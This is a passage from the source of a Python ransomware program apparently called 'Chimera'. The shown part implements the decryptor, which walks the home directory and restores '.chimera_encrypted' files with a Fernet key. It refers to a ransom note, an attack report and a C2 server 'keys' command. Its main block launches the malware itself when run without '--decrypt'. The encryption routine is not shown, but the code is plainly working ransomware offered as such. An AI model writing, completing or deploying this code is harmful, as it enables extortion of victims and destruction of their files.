            True if decryption succeeded, False otherwise
        """
        try:
            # Remove the .chimera_encrypted extension to get original filename
            original_path = encrypted_path.replace('.chimera_encrypted', '')
            
            # Read the encrypted file content
            with open(encrypted_path, 'rb') as f:
                encrypted_data = f.read()
            
            # Decrypt the data using the Fernet cipher
            decrypted_data = self.cipher_suite.decrypt(encrypted_data)
            
            # Write the decrypted data back to the original filename
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            # Delete the encrypted file (cleanup)
            os.remove(encrypted_path)
            return True
            
        except Exception as e:
            # Only print first error with details, suppress repeated errors
            if not hasattr(self, '_error_shown'):
                print(f"\n[!] DECRYPTION ERROR: {str(e)}")
                print(f"[!] This usually means the key is incorrect or in wrong format")
                print(f"[!] File: {os.path.basename(encrypted_path)}\n")
                self._error_shown = True
            return False
    
    def decrypt_all_files(self, start_folder):
        """Decrypt all encrypted files in a folder and subdirectories"""
        decrypted_count = 0
        failed_count = 0
        total_encrypted = 0
        
        # First, count total encrypted files
        print(f"[*] Scanning for encrypted files in: {start_folder}")
        for root, dirs, files in os.walk(start_folder):
            for file in files:
                if file.endswith('.chimera_encrypted'):
                    total_encrypted += 1
        
        print(f"[*] Found {total_encrypted} encrypted files")
        print(f"[*] Starting decryption...\n")
        
        # Decrypt each file with progress reporting
        for root, dirs, files in os.walk(start_folder):
            for file in files:
                if file.endswith('.chimera_encrypted'):
                    file_path = os.path.join(root, file)
                    if self.decrypt_file(file_path):
                        decrypted_count += 1
                        # Show progress every 10 files
                        if decrypted_count % 10 == 0:
                            print(f"    Progress: {decrypted_count}/{total_encrypted} files decrypted...")
                    else:
                        failed_count += 1
        
        # Final report
        print(f"\n{'='*50}")
        print(f"DECRYPTION COMPLETE")
        print(f"{'='*50}")
        print(f"✓ Successfully decrypted: {decrypted_count} files")
        if failed_count > 0:
            print(f"✗ Failed to decrypt: {failed_count} files")
        print(f"Total processed: {total_encrypted} files")
        return decrypted_count

# ==========================================
# MAIN EXECUTION
# ==========================================

if __name__ == "__main__":
    # Check if we're in decryption mode
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        if len(sys.argv) > 2:
            # Get the key from command line
            key_str = sys.argv[2]
            print(f"[*] Attempting decryption with key: {key_str}")
            
            try:
                # CRITICAL FIX: Fernet keys are ALREADY base64-encoded
                # The key from Fernet.generate_key() is in base64 format
                # We should NOT decode it - pass it directly as bytes
                import base64
                
                # Add padding if needed (base64 requires length % 4 == 0)
                key_str_padded = key_str
                padding_needed = len(key_str) % 4
                if padding_needed:
                    key_str_padded += '=' * (4 - padding_needed)
                
                # Convert string to bytes (Fernet expects bytes, not string)
                # But keep it in base64 format - do NOT decode it
                key_bytes = key_str_padded.encode('utf-8')
                
                print(f"[*] Using Fernet key in base64 format ({len(key_bytes)} chars)")
                
                # Validate that this looks like a proper base64 Fernet key
                # Should be 44 characters (32 bytes base64-encoded = 44 chars with padding)
                if len(key_bytes) != 44:
                    print(f"[!] WARNING: Key is {len(key_bytes)} characters, expected 44")
                    print(f"[!] This key may not work. Check if you copied the complete key.")
                
                decryptor = ChimeraDecryptor(key_bytes)
                decryptor.decrypt_all_files(os.path.expanduser("~"))
                
            except Exception as e:
                print(f"\n[!] FATAL ERROR: Could not initialize decryptor")
                print(f"[!] Error: {e}")
                print(f"\n[?] TROUBLESHOOTING:")
                print(f"    1. Make sure you copied the COMPLETE key from the ransom note")
                print(f"    2. Key should be ~44 characters long (base64 format)")
                print(f"    3. Check chimera_attack_report.txt or READ_ME_FOR_DECRYPT.txt")
                print(f"    4. On C2 server, use 'keys' command to view all encryption keys")
        else:
            print("Usage: python chimera_real.py --decrypt <FULL_KEY_FROM_NOTE>")
            print("Encryption key can be found in chimera_attack_report.txt or ransom note")
    else:
        # Run the malware
        malware = CompleteChimeraMalware()
        malware.execute_malware()